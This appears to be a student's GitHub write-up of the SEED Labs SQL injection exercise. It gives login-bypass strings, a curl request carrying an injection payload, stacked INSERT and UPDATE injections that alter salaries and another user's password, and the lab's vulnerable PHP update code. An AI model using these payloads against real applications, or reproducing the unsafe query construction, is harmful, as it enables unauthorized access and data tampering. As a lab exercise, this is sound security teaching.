# SQL_INJECTION
###Task 1: 	Log in MYSQL:

	
  
    mysql -u root -pseedubuntu;
    
		mysql> use Users;
    
		mysql> show tables;
	
//Use such a SQL query:
		
    select * from credential where Name='Alice';



![alt text](https://github.com/RubiaQayoum/SQL_INJECTION/blob/main/task%201.png)
 
 
 ###Task 2: 
 -->Task 2.1
    
    .USERNAME: "Admin' #"
	  
    .PASSWORD: "xyz" (here is password is optional)


//We will result in SQL Query

		
    SELECT id, name, eid, salary, birth, ssn, address, email, nickname, password 
    FROM credential WHERE name='Admin' #' && password='xyz'
 
 --> Task 2.2: Write Code on Terminator in Seed Lab:
	 
    
    curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23';
	
  
    
    	2- Copy the HTML code.
	3- Make a new file in location "file:///home/seed/Documents/temp.html"
	4- Run this location on browser
    
    
![alt text](https://github.com/RubiaQayoum/SQL_INJECTION/blob/main/task%202.1.png)



--> Task 2.3: Use the Inject statement to append a row to current database:
	

	INSERT INTO credential (name,eid) VALUES('Rubia', '123');

	After row inserted, go to browser and input as:

	.USERNAME: "1=1; INSERT INTO credential (name,eid) VALUES('Waleed','17422') #"

	.PASSWORD: "" (blank field)
	



![alt text](https://github.com/RubiaQayoum/SQL_INJECTION/blob/main/task%202.3.png)



###Task 3
use link

http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php


--> Task 3.1

	1- Login as Username= 'Alice' && Password = xyz, 
	2- Then edit the link to browser 
	http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php
	
	3- Update Phone Number as ', Salary=1000000 and save.

--> Task 3.2

	1- Login as Username= 'Boby' #' and then open edit profile
	
	2- Update Phone Number: ',Salary=0 and remaining unchanges


![alt text](https://github.com/RubiaQayoum/SQL_INJECTION/blob/main/task%203.2.png)



//Login as Alice
		
		Assume login as Boby and keep Alice login too. Open Alice profile edit


Update Phone Number: ', Salary=1 where name='Boby' #


--> Task 3.3: 	We're login as Boby but change password of Alice

	$conn = getDB();
	// Don't do this, this is not safe against SQL injection attack
	$sql="";
	if($input_pwd!=''){
	// In case password field is not empty.
	$hashed_ = sha1($input_pwd);
	//Update the password stored in the session.
	$_SESSION['pwd']=$hashed_pwd;
	$sql = "UPDATE credential SET 	nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;";
	}else{
	// if passowrd field is empty.
	$sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;";
	}
	$conn->query($sql);
	$conn->close();
	header("Location: unsafe_home.php");
	exit();
	
	
	
	
